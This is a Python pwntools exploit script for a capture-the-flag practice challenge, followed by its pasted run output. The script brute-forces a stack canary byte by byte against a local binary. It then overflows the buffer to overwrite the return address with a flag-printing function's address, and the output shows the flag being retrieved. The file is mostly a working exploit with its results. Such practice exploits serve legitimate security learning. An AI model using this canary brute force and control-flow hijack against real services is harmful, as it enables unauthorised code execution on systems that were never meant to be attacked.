#coding=utf8
from pwn import *

# context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']
context(arch='i386', os='linux')#arch也可以是i386~看文件

p = process('./bin1')

p.recvuntil('welcome\n')
canary = b'\x00'
for i in range(3):
    for i in range(256):
        txt = b'a'*100 + canary + bytes([i])
        # print("txt: ", txt)
        p.send(txt)
        a = p.recvuntil("welcome\n")
        if b"recv" in a:
            canary += bytes([i])
            print("canary: ", canary)
            break
print("type(canary): ", type(canary))
getflag = 0x0804863B
print("getflag: ", getflag)
print("p32(getflag): ", p32(getflag))
payload = b'a'*100 + canary + b'b'*12 + p32(getflag)
p.sendline(payload)
p.interactive()


"""
└─# python exp.py
[+] Starting local process './bin1': pid 248869
/root/ctf-practice/canary/02/exp.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('welcome\n')
/root/ctf-practice/canary/02/exp.py:17: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  a = p.recvuntil("welcome\n")
canary:  b'\x00?'
canary:  b'\x00?\xb2'
canary:  b'\x00?\xb2a'
type(canary):  <class 'bytes'>
getflag:  134514235
p32(getflag):  b';\x86\x04\x08'
[*] Switching to interactive mode
flag123

welcome
recv sucess
welcome

"""